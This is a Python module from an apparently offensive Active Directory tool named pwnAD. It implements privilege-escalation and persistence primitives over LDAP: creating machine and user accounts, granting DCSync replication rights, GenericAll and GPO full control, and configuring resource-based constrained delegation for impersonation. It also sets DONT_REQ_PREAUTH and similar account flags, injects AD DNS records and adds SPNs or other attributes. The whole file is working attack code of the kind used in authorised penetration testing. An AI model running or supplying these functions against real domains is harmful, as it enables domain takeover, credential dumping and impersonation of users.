import copy
import logging
import random
import string
import ldap3
from impacket.ldap import ldaptypes
from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM, RESULT_ENTRY_ALREADY_EXISTS, RESULT_INSUFFICIENT_ACCESS_RIGHTS, RESULT_NO_SUCH_OBJECT
from ldap3 import MODIFY_REPLACE, MODIFY_ADD, BASE
from ldap3.utils.conv import escape_filter_chars
from ldap3.protocol.microsoft import security_descriptor_control

from pwnAD.lib.accesscontrol import *
from pwnAD.lib.utils import check_error, resolve_target, encode_ldap_value
from pwnAD.lib.dns import DNSRecord, DNS_RECORD_TYPE, get_zone_dn, get_soa_serial


def computer(conn, new_computer=None, new_password=None):
    """
    Create a new computer account in Active Directory.

    Args:
        conn: LDAP connection object
        new_computer: Computer name (will append '$' if not present). Random if None
        new_password: Password for the computer account. Random if None

    Returns:
        str: Computer name (with $) if successful, None otherwise
    """
    computerscontainer =  'cn=Computers,' + conn._baseDN
    if not new_computer:
        new_computer = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
    else:
        new_computer = new_computer if new_computer.endswith('$') else new_computer + '$'

    if not new_password:
        new_password = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
    
    computer_hostname = new_computer [:-1]
    newComputerDn = ('cn=%s,%s' % (computer_hostname, computerscontainer)).encode('utf-8')

    # Default computer SPNs
    spns = [
        'HOST/%s' % computer_hostname,
        'HOST/%s.%s' % (computer_hostname, conn.domain),
        'RestrictedKrbHost/%s' % computer_hostname,
        'RestrictedKrbHost/%s.%s' % (computer_hostname, conn.domain),
    ]
    ucd = {
        'dnsHostName': '%s.%s' % (computer_hostname, conn.domain),
        'userAccountControl': 4096,
        'servicePrincipalName': spns,
        'sAMAccountName': new_computer,
        'unicodePwd': '"{}"'.format(new_password).encode('utf-16-le')
    }
    logging.debug('New computer info %s', ucd)
    logging.info('Attempting to create computer')
    
    try:
        if conn.exists(new_computer):
            logging.error(f"Computer {new_computer} already exists")
            return
        else:
            conn.add(newComputerDn.decode('utf-8'), ['top','person','organizationalPerson','user','computer'], ucd)
            logging.info('Adding new computer with username: %s and password: %s result: OK' % (new_computer, new_password))
    except ldap3.core.exceptions.LDAPException as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)

    return new_computer


def user(conn, new_user, new_password, OU=None):
    """
    Create a new user account in Active Directory.

    Args:
        conn: LDAP connection object
        new_user: Username for the new account
        new_password: Password for the new account
        OU: Optional Organizational Unit (relative to base DN). Defaults to cn=Users
    """
    if OU:
        container = OU + conn._baseDN
    else:
        container = "cn=Users," + conn._baseDN
    user_dn = f"cn={new_user},{container}"
    password_value = ('"%s"' % new_password).encode('utf-16-le')
    attr = {
        "objectClass": ["top", "person", "organizationalPerson", "user"],
        "distinguishedName": user_dn,
        "sAMAccountName": new_user,
        "userAccountControl": 544,
        "unicodePwd": password_value
    }
    logging.debug("Trying to add the new user")
    try:
        if conn.exists(new_user):
            logging.error(f"User {new_user} already exists")
            return
        else:
            conn.add(user_dn, attributes=attr)
            logging.info(f"User {new_user} has been created successfully.")
    except ldap3.core.exceptions.LDAPException as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)


def dcsync(conn, trustee):
    """
    Grant DCSync rights to a user by adding replication ACEs to the domain root.

    Args:
        conn: LDAP connection object
        trustee: sAMAccountName of the user to grant DCSync rights

    Note:
        Adds three ACEs for DS-Replication-Get-Changes GUIDs
    """
    #Todo : check if account already have dcsync rights
    targetDN, targetSID = conn.ldap_get_user(trustee)

    res = conn.search(search_base=conn._baseDN, search_filter=f'(distinguishedName={conn._baseDN})', attributes=['nTSecurityDescriptor'])
    if res is None:
        logging.error('Failed to get forest\'s SD')
        return

    baseDN_sd = conn._ldap_connection.entries[0].entry_raw_attributes
    if baseDN_sd['nTSecurityDescriptor'] == []:
        logging.error("User doesn't have right read nTSecurityDescriptor!")
        return

    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=baseDN_sd['nTSecurityDescriptor'][0])
    new_sd = copy.deepcopy(sd)
    access_mask = ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]

    for guid in ['1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c']:
        logging.debug(f"Creating new ACE for SID : {targetSID} and guid : {guid}")
        new_sd['Dacl'].aces.append(create_allow_ace(sid=targetSID, object_type=guid, access_mask=access_mask))

    try:
        conn.modify(conn._baseDN, {'nTSecurityDescriptor': [MODIFY_REPLACE, [new_sd.getData()]]})
        logging.info("Granted user '%s' DCSYNC rights!" % (trustee))
    except ldap3.core.exceptions.LDAPException as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)


def genericAll(conn, target, trustee):
    """
    Grant GenericAll (full control) rights to a trustee over a target object.

    Args:
        conn: LDAP connection object
        target: sAMAccountName of the target object
        trustee: sAMAccountName of the user receiving the rights
    """
    #Todo : check if account already have genericAll rights
    _, trusteeSID = conn.ldap_get_user(trustee)
    targetDN, _ = conn.ldap_get_user(target)

    res = conn.search(search_base=targetDN, search_filter=f'(distinguishedName={targetDN})', attributes=['nTSecurityDescriptor'])
    if res is None:
        logging.error('Failed to get forest\'s SD')

    targetDN_sd = conn._ldap_connection.entries[0].entry_raw_attributes
    if targetDN_sd['nTSecurityDescriptor'] == []:
        logging.error("User doesn't have right read nTSecurityDescriptor!")
        return

    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetDN_sd['nTSecurityDescriptor'][0])
    new_sd = copy.deepcopy(sd)
    new_sd['Dacl'].aces.append(create_allow_ace(sid=trusteeSID))

    try:
        conn.modify(targetDN, {'nTSecurityDescriptor': [MODIFY_REPLACE, [new_sd.getData()]]})
        logging.info("Granted user '%s' generiAll rights over '%s' !" % (trustee, target))
    except ldap3.core.exceptions.LDAPException as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)


def groupMember(conn, group: str, member: str):
    """
    Add a user to a group.

    Args:
        conn: LDAP connection object
        group: sAMAccountName of the target group
        member: sAMAccountName of the user to add
    """
    user_dn = conn.get_dn_from_samaccountname(member, 'user')
    group_dn = conn.get_dn_from_samaccountname(group, 'group')

    conn.search(search_base=group_dn, search_filter=f"(member={user_dn})", search_scope=BASE, attributes=['member'])
    if conn._ldap_connection.entries:
        logging.error(f"{member} is already a member of {group}.")
        return

    try:
        conn.modify(group_dn, {'member': [(MODIFY_ADD, [user_dn])]})
        logging.info(f"{member} added to {group} successfully !")
    except ldap3.core.exceptions.LDAPException as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)



def write_gpo_dacl(conn, user, gposid):
    """
    Grant a user full control over a Group Policy Object.

    Args:
        conn: LDAP connection object
        user: sAMAccountName of the user to grant rights
        gposid: GUID of the target GPO
    """
    conn.search(conn._baseDN, '(&(objectclass=person)(sAMAccountName=%s))' % user, attributes=['objectSid'])
    if len(conn._ldap_connection.entries) <= 0:
        logging.error("User not found")
        return

    user = conn._ldap_connection.entries[0]

    controls = security_descriptor_control(sdflags=0x04)
    conn.search(conn._baseDN, '(&(objectclass=groupPolicyContainer)(name=%s))' % gposid, attributes=['objectSid','nTSecurityDescriptor'], controls=controls)

    if len(conn._ldap_connection.entries) <= 0:
        logging.error("GPO not found")
        return
    gpo = conn._ldap_connection.entries[0]

    secDescData = gpo['nTSecurityDescriptor'].raw_values[0]
    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
    newace = create_allow_ace(str(user['objectSid']))
    secDesc['Dacl']['Data'].append(newace)
    data = secDesc.getData()

    try:
        conn.modify(gpo.entry_dn, {'nTSecurityDescriptor':(MODIFY_REPLACE, [data])}, controls=controls)
        logging.info('LDAP server claims to have taken the secdescriptor. Have fun')
    except ldap3.core.exceptions.LDAPException as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)


def RBCD(conn, target, grantee):
    """
    Configure Resource-Based Constrained Delegation (RBCD).

    Args:
        conn: LDAP connection object
        target: sAMAccountName of the target computer (delegate to)
        grantee: sAMAccountName of the account allowed to delegate (delegate from)

    Note:
        Allows grantee to impersonate users on target via S4U2Proxy
    """
    success = conn.search(conn._baseDN, '(sAMAccountName=%s)' % escape_filter_chars(target), attributes=['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
    if success is False or len(conn._ldap_connection.entries) != 1:
        logging.error("Error expected only one search result got %d results", len(conn._ldap_connection.entries))
        return

    target_result = conn._ldap_connection.entries[0]
    target_sid = target_result["objectSid"].value
    logging.info("Found Target DN: %s" % target_result.entry_dn)
    logging.info("Target SID: %s\n" % target_sid)

    success = conn.search(conn._baseDN, '(sAMAccountName=%s)' % escape_filter_chars(grantee), attributes=['objectSid'])
    if success is False or len(conn._ldap_connection.entries) != 1:
        logging.error("Error expected only one search result got %d results", len(conn._ldap_connection.entries))
        return

    grantee_result = conn._ldap_connection.entries[0]
    grantee_sid = grantee_result["objectSid"].value
    logging.info("Found Grantee DN: %s" % grantee_result.entry_dn)
    logging.info("Grantee SID: %s" % grantee_sid)

    try:
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target_result['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0])
        logging.debug('Currently allowed sids:')
        for ace in sd['Dacl'].aces:
            logging.debug('    %s' % ace['Ace']['Sid'].formatCanonical())

            if ace['Ace']['Sid'].formatCanonical() == grantee_sid:
                logging.error("Grantee is already permitted to perform delegation to the target host")
                return

    except IndexError:
        sd = create_empty_sd()
        
    sd['Dacl'].aces.append(create_allow_ace(grantee_sid))
    

    try:
        conn.modify(target_result.entry_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity':[MODIFY_REPLACE, [sd.getData()]]})
        logging.info('Delegation rights modified successfully!')
        logging.info('%s can now impersonate users on %s via S4U2Proxy' % (grantee, target))
    except ldap3.core.exceptions.LDAPException as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)


def uac(conn, target: str, flags: list):
    """
    Add property flags to userAccountControl attribute.

    Args:
        conn: LDAP connection object
        target: sAMAccountName of the target user/computer
        flags: List of UAC flag names to add (e.g., ['DONT_REQ_PREAUTH', 'TRUSTED_FOR_DELEGATION'])
    """
    # Build the UAC value from provided flags
    uac_to_add = 0
    for flag in flags:
        flag_upper = flag.upper()
        if flag_upper not in ACCOUNT_FLAGS:
            logging.error(f"Unknown UAC flag: {flag}")
            logging.info(f"Available flags: {', '.join(ACCOUNT_FLAGS.keys())}")
            return
        uac_to_add |= ACCOUNT_FLAGS[flag_upper]

    # Search for the target and get current userAccountControl
    conn.search(
        conn._baseDN,
        '(sAMAccountName=%s)' % escape_filter_chars(target),
        attributes=['distinguishedName', 'userAccountControl']
    )

    if not conn._ldap_connection.entries:
        logging.error(f"Target '{target}' not found in LDAP")
        return

    entry = conn._ldap_connection.entries[0]
    target_dn = entry.entry_dn

    try:
        old_uac = entry['userAccountControl'].value
    except (KeyError, IndexError):
        logging.error(f"Cannot read userAccountControl attribute for '{target}'")
        return

    # Combine old UAC with new flags using bitwise OR
    new_uac = old_uac | uac_to_add

    if new_uac == old_uac:
        logging.info(f"Flags {flags} already set on '{target}'")
        return

    logging.debug(f"Original userAccountControl: {old_uac}")
    logging.debug(f"New userAccountControl: {new_uac}")

    try:
        conn.modify(target_dn, {'userAccountControl': [(MODIFY_REPLACE, [new_uac])]})
        logging.info(f"Successfully added {flags} to '{target}' userAccountControl")
    except ldap3.core.exceptions.LDAPException as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)


def dnsRecord(conn, name: str, data: str, dnstype: str = "A", zone: str = None, ttl: int = 300, preference: int = 10, priority: int = 0, weight: int = 100, srvport: int = 80):
    """
    Based on bloodyAD code.
    Add a DNS record to Active Directory Integrated DNS.

    Args:
        conn: LDAP connection object
        name: Hostname for the DNS record
        data: Record data (IP address, hostname, or text)
        dnstype: Type of DNS record (A, AAAA, CNAME, MX, PTR, SRV, TXT)
        zone: DNS zone name (default: current domain)
        ttl: Time to live in seconds (default: 300)
        preference: Preference for MX records (default: 10)
        priority: Priority for SRV records (default: 0)
        weight: Weight for SRV records (default: 100)
        srvport: Port for SRV records (default: 80)
    """
    # Use current domain as zone if not specified
    if zone is None:
        zone = conn.domain

    logging.info(f"Adding DNS record: {name}.{zone} ({dnstype}) -> {data}")

    try:
        # Build zone DN
        naming_context = "," + conn._baseDN
        zone_types = ["DomainDnsZones", "ForestDnsZones"]

        serial = None
        record_dn = None
        existing_records = None
        zone_dn = None

        # Try to find the zone and SOA in different locations
        for zone_type in zone_types:
            zone_dn = f"DC={zone},CN=MicrosoftDNS,DC={zone_type}{naming_context}"
            logging.debug(f"Trying zone: {zone_dn}")

            try:
                # Search for both SOA (@) and existing record in one query
                conn.search(
                    search_base=zone_dn,
                    search_filter=f"(|(name=@)(name={name}))",
                    search_scope=ldap3.SUBTREE,
                    attributes=["name", "dnsRecord", "distinguishedName"],
                )

                if not conn._ldap_connection.entries:
                    logging.debug(f"No entries found in {zone_type}")
                    continue

                # Parse results
                for entry in conn._ldap_connection.entries:
                    entry_name = entry.name.value if hasattr(entry.name, 'value') else str(entry.name)

                    if entry_name == "@":
                        # Found SOA record
                        if "dnsRecord" in entry and entry["dnsRecord"].raw_values:
                            for record_data in entry["dnsRecord"].raw_values:
                                try:
                                    dns_record = DNSRecord(record_data)
                                    if dns_record.record_type == DNS_RECORD_TYPE.get("SOA", 0x0006):
                                        serial = dns_record.serial
                                        logging.debug(f"Found SOA serial: {serial}")
                                        break
                                    # Use any record's serial if SOA not found
                                    if serial is None:
                                        serial = dns_record.serial
                                        logging.debug(f"Using serial from type {dns_record.record_type}: {serial}")
                                except Exception as e:
                                    logging.debug(f"Error parsing SOA record: {e}")

                    elif entry_name.lower() == name.lower():
                        # Found existing record
                        record_dn = entry.distinguishedName.value
                        existing_records = entry["dnsRecord"].raw_values if "dnsRecord" in entry else []
                        logging.debug(f"Found existing record at: {record_dn}")

                # If we found a serial, this is the right zone
                if serial is not None:
                    logging.debug(f"Using zone type: {zone_type}")
                    break

            except Exception as e:
                logging.debug(f"Error searching {zone_type}: {e}")
                continue

        if serial is None:
            raise Exception(f"No '@' entry found in any zone for '{zone}'")

        # Create the DNS record
        dns_record = DNSRecord()
        dns_record.from_dict(
            dns_type=dnstype,
            record_data=data,
            serial=serial,
            ttl=ttl,
            preference=preference,
            priority=priority,
            weight=weight,
            port=srvport,
        )

        new_dns_record_bytes = dns_record.to_bytes()

        if record_dn:
            # Record exists, append to existing dnsRecord list
            new_dnsrecord_list = list(existing_records) if existing_records else []
            new_dnsrecord_list.append(new_dns_record_bytes)

            logging.debug(f"Updating existing record at {record_dn}")
            try:
                conn.modify(record_dn, {"dnsRecord": [(MODIFY_REPLACE, new_dnsrecord_list)]})
                logging.info(f"DNS record '{name}' updated successfully")
            except ldap3.core.exceptions.LDAPException as e:
                error_code = conn._ldap_connection.result['result']
                check_error(conn, error_code, e)
        else:
            # Record doesn't exist, create it
            record_dn = f"DC={name},{zone_dn}"
            attributes = {
                "objectClass": ["top", "dnsNode"],
                "dnsRecord": new_dns_record_bytes,
                "dNSTombstoned": False,  # Ensure record is not tombstoned
            }

            logging.debug(f"Creating new record at {record_dn}")
            try:
                conn.add(record_dn, attributes=attributes)
                logging.info(f"DNS record '{name}' added successfully")
            except ldap3.core.exceptions.LDAPException as e:
                error_code = conn._ldap_connection.result['result']
                check_error(conn, error_code, e)

    except Exception as e:
        logging.error(f"Failed to add DNS record: {e}")
        raise


def attribute(conn, target: str, attr: str, values: list, raw: bool = False, b64: bool = False):
    """
    Add values to an attribute of any LDAP object.

    This function adds values to a multi-valued attribute without removing
    existing values. Supports multiple target identification formats.

    Args:
        conn: LDAP connection object
        target: Target identifier (sAMAccountName, DN, or SID)
        attr: Name of the attribute to add values to
        values: List of values to add
        raw: If True, send values as-is without encoding (default: False)
        b64: If True, decode values from base64 first (default: False)

    Example:
        add attribute user1 servicePrincipalName MSSQLSvc/server:1433
        add attribute computer1$ servicePrincipalName HTTP/server.domain.local
    """
    # Resolve target to DN
    target_dn = resolve_target(conn, target)
    if not target_dn:
        return

    # Encode values
    encoded_values = []
    for value in values:
        encoded_value = encode_ldap_value(attr, value, raw=raw, b64=b64)
        if encoded_value is None:
            logging.error(f"Failed to encode value: {value}")
            return
        encoded_values.append(encoded_value)

    # Perform the modification
    try:
        logging.debug(f"Adding to {target_dn}: {attr} += {encoded_values}")
        conn.modify(target_dn, {attr: [(MODIFY_ADD, encoded_values)]})
        logging.info(f"Successfully added value(s) to attribute '{attr}' on {target}")
    except ldap3.core.exceptions.LDAPException as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)
    except Exception as e:
        logging.error(f"Error adding attribute value: {e}")
